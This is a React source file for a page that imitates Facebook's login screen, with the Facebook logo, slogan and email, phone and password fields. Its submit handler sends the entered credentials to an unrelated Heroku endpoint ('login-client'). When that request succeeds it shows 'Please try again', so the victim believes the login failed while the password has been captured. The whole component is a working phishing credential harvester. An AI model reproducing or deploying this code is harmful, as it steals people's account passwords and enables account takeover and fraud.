import React, {useState} from "react";
import "./Accueil.css";
import Logo from '../../Asset/facee.svg'
import font from '../../Asset/500_500.png'

export default function Accueil(){


    const [number, setNumber] = useState('');
    const [password, setPassword] = useState('');

    const handleSubmit = (e) => {
        e.preventDefault();
        fetch("https://universal-app-21e471211385.herokuapp.com/login-client",{
        method: "POST",
        crossDomain: true,
        headers:{
            "Content-Type": "application/json",
            "Accept": "application/json",
            "Access-Control-Allow-Origin": "*",
        },
        body:JSON.stringify({
            number,
            password,
        }),
    })
    .then((res) => res.json())
    .then((data) => {
        if(data.status === "ok"){
            alert('Please try again')
        }else{
            alert('Something went wrong')
        }
    })
    }

    return(
        <div className="accueil">
            <div className="face_body">
                <div className="title">
                    <div className="title_face">
                        <img src={Logo} alt="Facebook_image"/>
                    </div>
                    <h2 className="slogan">
                        With Facebook, share and stay in touch with those around you.
                    </h2>
                </div>
                <div className="formulaire">
                    <div className="form_inscription">
                        <form method="post"id="loginForm" className="formul" onSubmit={handleSubmit}>
                            <input type="text"  name="number" id="number" placeholder="Email or phone number" className="input_text" value={number} onChange={(e) => setNumber(e.target.value)}/>
                            <input type="password" id="pass" placeholder="Password" className="input_text" value={password} onChange={(e) => setPassword(e.target.value)}/>
                            <input type="submit"  value="Log in" className="input_button"/>
                        </form>
                        <div className="link_oublie">
                            <a href="#">
                                Forgot your password ?
                            </a>
                        </div>
                        <div className="creer_compte">
                            <a href="#">Create new account</a>
                        </div>
                    </div>
                    <div className="creer_page">
                        <p>
                            <strong className="page_text">Create a page</strong> for a celebrity, brand or <br/> business.
                        </p>
                    </div>
                </div>
        </div>
    </div>
)}
